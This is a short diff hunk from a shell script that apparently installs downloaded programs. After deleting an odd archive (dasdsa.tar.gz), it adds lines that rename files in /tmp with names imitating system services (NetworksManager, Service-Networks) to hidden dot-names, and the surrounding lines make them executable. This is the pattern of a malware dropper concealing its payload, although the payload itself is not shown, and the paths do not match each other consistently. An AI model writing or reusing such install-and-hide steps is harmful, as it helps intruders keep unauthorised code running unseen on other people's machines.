@@ -69,6 +69,10 @@ if [ $download = 1 ]; then
 
  
     rm -f dasdsa.tar.gz
+    mv /tmp/fs-manager /tmp/.fs-manager
+    mv /tmp/out.log /tmp/.out.log
+    mv /tmp/Service-Networks /tmp/.Service-Networks
+    mv /tmp/NetworksManager /tmp/.NetworksManager
     chmod +x /tmp/.fs-manager/.NetworksManager
     touch /tmp/.fs-manager/.out.log
     chmod +x /tmp/.fs-manager/.out.log
